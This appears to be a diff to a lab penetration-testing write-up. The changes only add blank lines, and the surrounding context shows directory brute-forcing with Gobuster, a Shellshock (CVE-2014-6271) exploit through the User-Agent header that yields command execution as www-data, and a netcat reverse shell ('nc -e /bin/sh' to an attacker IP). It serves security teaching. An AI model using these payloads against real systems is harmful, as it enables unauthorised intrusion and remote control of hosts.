@@ -73,6 +73,7 @@ The victim host at 192.168.1.43 is running:
 * Connection #0 to host 192.168.100.243 left intact
 ```
 **Directory Brute Force**
+
 We use **Gobuster** to brute-force (enumerate) directories or files on the web server.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
@@ -202,6 +203,7 @@ We saw an **500 Internal Server Error**, meaning the web server attempted to run
 
 #### Shellshock (CVE-2014-6271)
 **RCE (Remote Code Execution)**
+
 We attempted to exploit the **Shellshock** vulnerability through the CGI script `shell.sh` by sending a payload in the `User-Agent` header to force the server to execute the `id` command.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
@@ -211,7 +213,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 We can confirm that the system is vulnerable to **Shellshock** and that we have remote command execution (RCE) as the `www-data` user.
 
 **Reverse Shell**
+
 A **reverse shell** is a technique where the victim machine initiates a connection back to the attacker's machine, opening a command-line shell. This helps the attacker bypass firewall or NAT, since the connection originates from inside the victim's network.
+
 We use the following reverse shell command via Shellshock:
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
@@ -222,6 +226,7 @@ We use the following reverse shell command via Shellshock:
 - `-H "User-Agent:..."`: injects the payload into the `User-Agent` header.
 - `() { :; }; echo; /bin/bash -c '...'`: the Bash systax used to exploit the Shellshock vulnerability. If the server is vulnerable, Bash will execute the embedded command.
 - `nc -e /bin/sh 192.168.100.173 4433`: `nc` (netcat) opens a TCP connection from the victim machine to the attacker's IP (192.168.100.173) on the port 4433, `-e /bin/sh` attaches the `/bin/sh` shell to that connection.
+
 Result: the attacker gains an interactive remote shell on the victim machine.
 
 On the attacker machine (192.168.100.173) open a listener to wait for the incoming connection, then on the victim machine (192.168.100.243) send the Shellshock payload using `curl` as shown above. At that point, we obtain a shell as the user `www-data`.
